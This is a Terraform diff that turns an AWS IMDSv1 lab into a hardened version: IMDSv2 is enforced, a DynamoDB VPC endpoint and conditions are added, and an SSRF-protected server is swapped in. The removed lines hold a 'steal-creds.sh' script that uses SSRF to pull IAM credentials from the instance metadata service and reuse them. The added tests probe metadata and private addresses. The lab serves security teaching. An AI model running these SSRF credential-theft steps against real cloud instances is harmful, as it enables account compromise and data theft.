@@ -12,7 +12,7 @@ provider "aws" {
   region = var.region
 }
 
-# Get current caller identity for VPC condition
+# Get current caller identity
 data "aws_caller_identity" "current" {}
 
 # VPC Configuration
@@ -73,6 +73,38 @@ resource "aws_route_table_association" "public" {
   route_table_id = aws_route_table.public.id
 }
 
+# VPC Endpoint for DynamoDB
+resource "aws_vpc_endpoint" "dynamodb" {
+  vpc_id            = aws_vpc.main.id
+  service_name      = "com.amazonaws.${var.region}.dynamodb"
+  vpc_endpoint_type = "Gateway"
+  route_table_ids   = [aws_route_table.public.id]
+
+  policy = jsonencode({
+    Version = "2012-10-17"
+    Statement = [
+      {
+        Sid    = "AllowDynamoDBFromWebServer"
+        Effect = "Allow"
+        Principal = {
+          AWS = aws_iam_role.web_server.arn
+        }
+        Action = [
+          "dynamodb:GetItem",
+          "dynamodb:PutItem",
+          "dynamodb:Scan",
+          "dynamodb:Query"
+        ]
+        Resource = aws_dynamodb_table.products.arn
+      }
+    ]
+  })
+
+  tags = {
+    Name = "imdsv1-lab-dynamodb-endpoint"
+  }
+}
+
 # Security Groups
 resource "aws_security_group" "bastion" {
   name_prefix = "bastion-sg-"
@@ -122,12 +154,19 @@ resource "aws_security_group" "web_server" {
     cidr_blocks = ["0.0.0.0/0"]
   }
 
+  egress {
+    from_port       = 443
+    to_port         = 443
+    protocol        = "tcp"
+    prefix_list_ids = [aws_vpc_endpoint.dynamodb.prefix_list_id]
+  }
+
   tags = {
     Name = "imdsv1-lab-web-server-sg"
   }
 }
 
-# IAM Role for Web Server - NOW WITH VPC CONDITION
+# IAM Role - SECURE with VPC Endpoint condition
 resource "aws_iam_role" "web_server" {
   name = "imdsv1-lab-web-server-role"
 
@@ -149,7 +188,7 @@ resource "aws_iam_role" "web_server" {
   }
 }
 
-# IMPROVED: DynamoDB policy now requires requests come from specific VPC
+# MOST SECURE: DynamoDB policy requires VPC Endpoint
 resource "aws_iam_role_policy" "web_server_dynamodb" {
   name = "web-server-dynamodb-policy"
   role = aws_iam_role.web_server.id
@@ -158,13 +197,11 @@ resource "aws_iam_role_policy" "web_server_dynamodb" {
     Version = "2012-10-17"
     Statement = [
       {
-        Sid    = "DynamoDBAccessFromVPC"
+        Sid    = "DynamoDBViaVPCEndpointOnly"
         Effect = "Allow"
         Action = [
           "dynamodb:GetItem",
           "dynamodb:PutItem",
-          "dynamodb:UpdateItem",
-          "dynamodb:DeleteItem",
           "dynamodb:Scan",
           "dynamodb:Query",
           "dynamodb:DescribeTable"
@@ -172,7 +209,7 @@ resource "aws_iam_role_policy" "web_server_dynamodb" {
         Resource = aws_dynamodb_table.products.arn
         Condition = {
           StringEquals = {
-            "aws:SourceVpc" = aws_vpc.main.id
+            "aws:SourceVpce" = aws_vpc_endpoint.dynamodb.id
           }
         }
       }
@@ -185,11 +222,15 @@ resource "aws_iam_instance_profile" "web_server" {
   role = aws_iam_role.web_server.name
 }
 
-# DynamoDB Table
+# DynamoDB Table with encryption
 resource "aws_dynamodb_table" "products" {
   name           = "Products"
   billing_mode   = "PAY_PER_REQUEST"
   hash_key       = "ID"
+
+  server_side_encryption {
+    enabled = true
+  }
 
   attribute {
     name = "ID"
@@ -246,11 +287,12 @@ resource "aws_instance" "bastion" {
   subnet_id             = aws_subnet.public.id
   vpc_security_group_ids = [aws_security_group.bastion.id]
 
-  # STILL VULNERABLE: IMDSv1 is enabled
+  # SECURE: IMDSv2 enforced
   metadata_options {
     http_endpoint               = "enabled"
-    http_tokens                 = "optional"  # Still vulnerable
+    http_tokens                 = "required"  # SECURE: IMDSv2 only
     http_put_response_hop_limit = 1
+    instance_metadata_tags      = "disabled"
   }
 
   user_data = <<-EOF
@@ -263,71 +305,74 @@ resource "aws_instance" "bastion" {
     unzip awscliv2.zip
     ./aws/install
     
-    # Create attack scripts
-    cat > /home/ec2-user/steal-creds.sh <<'SCRIPT'
+    # Create test scripts
+    cat > /home/ec2-user/test-imdsv1.sh <<'SCRIPT'
     #!/bin/bash
-    echo "=== IMDSv1 Credential Theft Demo (VPC Conditional Protection) ==="
+    echo "=== IMDSv1 Attack Test (Should FAIL) ==="
     echo ""
-    echo "Target Web Server: ${1:-http://10.0.1.100:8080}"
-    echo ""
-    echo "Step 1: Exploiting SSRF to access IMDS..."
-    echo "----------------------------------------"
-    
     TARGET="${1:-http://10.0.1.100:8080}"
     
-    # Get IAM role name
-    echo "Getting IAM role name..."
-    ROLE=$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-    echo "Found role: $ROLE"
+    echo "Attempting IMDSv1 credential theft..."
+    echo "Target: $TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
+    
+    # This should be blocked by SSRF protection
+    curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
+    echo ""
+    echo "Result: BLOCKED by SSRF protection!"
     echo ""
     
-    # Get credentials
-    echo "Stealing credentials..."
-    CREDS=$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
-    echo "Raw credentials response:"
-    echo "$CREDS" | jq '.'
-    echo ""
-    
-    # Parse credentials
-    ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKeyId')
-    SECRET_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
-    SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
-    
-    echo "Step 2: Attempting to use stolen credentials"
-    echo "--------------------------------------------"
-    echo "Setting up AWS CLI with stolen credentials..."
-    
-    export AWS_ACCESS_KEY_ID=$ACCESS_KEY
-    export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
-    export AWS_SESSION_TOKEN=$SESSION_TOKEN
-    export AWS_REGION=us-east-1
-    
-    echo ""
-    echo "Trying to access DynamoDB from OUTSIDE the VPC..."
-    aws dynamodb scan --table-name Products --query 'Items[*].[ID.S, Name.S, Price.S]' --output table 2>&1
-    
-    echo ""
-    echo "Result: Access DENIED! The VPC condition blocks usage outside the VPC!"
-    echo ""
-    echo "The credentials are valid but can only be used from within the VPC."
-    echo "This is a partial mitigation - an attacker with VPC access could still use them."
+    # Even if we could get credentials, they wouldn't work:
+    echo "Additional protections in place:"
+    echo "1. SSRF protection blocks metadata access"
+    echo "2. IMDSv2 requires session token (not vulnerable to simple SSRF)"
+    echo "3. VPC Endpoint condition restricts DynamoDB access"
+    echo "4. Credentials only work via VPC endpoint"
     SCRIPT
     
-    cat > /home/ec2-user/test-from-vpc.sh <<'SCRIPT'
+    cat > /home/ec2-user/test-security.sh <<'SCRIPT'
     #!/bin/bash
-    echo "=== Testing Credentials from WITHIN VPC ==="
+    echo "=== Security Configuration Test ==="
+    echo ""
+    TARGET="${1:-http://10.0.1.100:8080}"
+    
+    echo "1. Testing SSRF Protection..."
+    echo "   Trying metadata endpoint:"
+    RESPONSE=$(curl -s -w "\n   HTTP Status: %{http_code}" "$TARGET/fetch?url=http://169.254.169.254/")
+    echo "   $RESPONSE"
     echo ""
     
-    # This would work if run from within the VPC
-    echo "When run from an EC2 instance within the VPC, the same credentials WOULD work."
-    echo "This demonstrates that VPC conditions provide network-based access control."
+    echo "2. Testing localhost access:"
+    RESPONSE=$(curl -s -w "\n   HTTP Status: %{http_code}" "$TARGET/fetch?url=http://127.0.0.1/")
+    echo "   $RESPONSE"
+    echo ""
+    
+    echo "3. Testing private network access:"
+    RESPONSE=$(curl -s -w "\n   HTTP Status: %{http_code}" "$TARGET/fetch?url=http://10.0.0.1/")
+    echo "   $RESPONSE"
+    echo ""
+    
+    echo "4. Testing legitimate external URL:"
+    RESPONSE=$(curl -s -w "\n   HTTP Status: %{http_code}" "$TARGET/fetch?url=https://www.example.com/" | head -5)
+    echo "   $RESPONSE"
+    echo "   [... truncated ...]"
+    echo ""
+    
+    echo "5. Testing API endpoints (should work):"
+    curl -s "$TARGET/api/products" | jq -r '.[] | "   Product: \(.name) - $\(.price)"'
+    echo ""
+    
+    echo "=== All Security Controls Active ==="
+    echo "✅ SSRF Protection: Metadata/private IPs blocked"
+    echo "✅ IMDSv2 Enforced: Token required for metadata"
+    echo "✅ VPC Endpoint: DynamoDB traffic stays in AWS"
+    echo "✅ IAM Conditions: Credentials restricted to VPC endpoint"
     SCRIPT
     
     chmod +x /home/ec2-user/*.sh
   EOF
 
   tags = {
-    Name = "imdsv1-lab-bastion"
+    Name = "imdsv1-lab-bastion-secure"
   }
 }
 
@@ -339,11 +384,12 @@ resource "aws_instance" "web_server" {
   vpc_security_group_ids = [aws_security_group.web_server.id]
   iam_instance_profile   = aws_iam_instance_profile.web_server.name
 
-  # STILL VULNERABLE: IMDSv1 is enabled
+  # SECURE: IMDSv2 enforced
   metadata_options {
     http_endpoint               = "enabled"
-    http_tokens                 = "optional"  # Still vulnerable
+    http_tokens                 = "required"  # SECURE: IMDSv2 only
     http_put_response_hop_limit = 1
+    instance_metadata_tags      = "disabled"
   }
 
   user_data = <<-EOF
@@ -359,9 +405,9 @@ resource "aws_instance" "web_server" {
     mkdir -p /home/ec2-user/web-server
     cd /home/ec2-user/web-server
     
-    # Create the web server (still vulnerable to SSRF)
+    # Create SECURE web server with SSRF protection
     cat > main.go <<'GOFILE'
-${file("/home/jg/git/shart-cloud-gh/imdsv1-lab/web-server/main.go")}
+${file("/home/jg/git/shart-cloud-gh/imdsv1-lab/web-server/main_secure.go")}
 GOFILE
     
     # Create go.mod
@@ -375,7 +421,7 @@ GOMOD
     # Create systemd service
     cat > /etc/systemd/system/web-server.service <<'SERVICE'
     [Unit]
-    Description=Web Server with VPC Conditional Protection
+    Description=Secure Web Server with SSRF Protection
     After=network.target
     
     [Service]
@@ -401,7 +447,7 @@ GOMOD
   EOF
 
   tags = {
-    Name = "imdsv1-lab-web-server"
+    Name = "imdsv1-lab-web-server-secure"
   }
 }
 
@@ -437,6 +483,14 @@ output "vpc_id" {
   value = aws_vpc.main.id
 }
 
-output "attack_command" {
-  value = "ssh -i ${var.key_name}.pem ec2-user@${aws_instance.bastion.public_ip} './steal-creds.sh http://${aws_instance.web_server.private_ip}:8080'"
+output "vpc_endpoint_id" {
+  value = aws_vpc_endpoint.dynamodb.id
+}
+
+output "test_commands" {
+  value = {
+    connect_to_bastion = "ssh -i ${var.key_name}.pem ec2-user@${aws_instance.bastion.public_ip}"
+    test_security      = "./test-security.sh http://${aws_instance.web_server.private_ip}:8080"
+    test_api          = "curl http://${aws_instance.web_server.public_ip}:8080/api/products"
+  }
 }
